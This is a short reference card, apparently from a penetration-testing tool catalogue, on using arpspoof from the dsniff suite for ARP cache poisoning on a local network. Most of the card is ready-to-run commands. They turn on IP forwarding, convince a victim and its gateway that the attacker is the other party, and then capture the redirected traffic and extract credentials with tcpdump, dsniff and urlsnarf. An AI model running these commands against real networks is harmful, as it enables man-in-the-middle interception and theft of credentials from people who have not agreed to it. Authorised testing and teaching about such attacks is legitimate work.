---
name: arpspoof
category: Traffic Analysis & Wireless
description: Simple ARP cache poisoning to redirect LAN traffic.
tags: [arp-spoof, mitm, dsniff, poisoning, lan]
---

# arpspoof

**arpspoof** (from the **dsniff** suite) performs ARP cache poisoning on a local network: it convinces a victim that the attacker is the gateway (and vice versa), redirecting traffic through you for a classic MITM. Minimal and reliable.

> `apt install dsniff` · **requires root** · works on the local segment only

## Enable forwarding first

Without IP forwarding you'll blackhole the victim (DoS) instead of relaying:

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

## Poison both directions

```bash
# Tell the victim you are the gateway
sudo arpspoof -i eth0 -t 10.0.0.5 10.0.0.1
# Tell the gateway you are the victim (second terminal)
sudo arpspoof -i eth0 -t 10.0.0.1 10.0.0.5
```

- `-i` interface · `-t <target> <host>` poison `target` to believe you are `host` · `-r` do both directions in one command.

```bash
sudo arpspoof -i eth0 -t 10.0.0.5 -r 10.0.0.1     # bidirectional
```

## Now capture the redirected traffic

```bash
sudo tcpdump -i eth0 -A host 10.0.0.5
# or extract creds with the dsniff suite
sudo dsniff -i eth0
sudo urlsnarf -i eth0
```

## Cleanup

Stop with `Ctrl+C` — arpspoof re-broadcasts the correct ARP mappings to restore the network. Then disable forwarding:

```bash
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```

> Poisoning the whole LAN can disrupt connectivity — target specific hosts and remember `ip_forward`. For a higher-level, all-in-one workflow (spoof + sniff + DNS), use [bettercap](#/tool/bettercap).
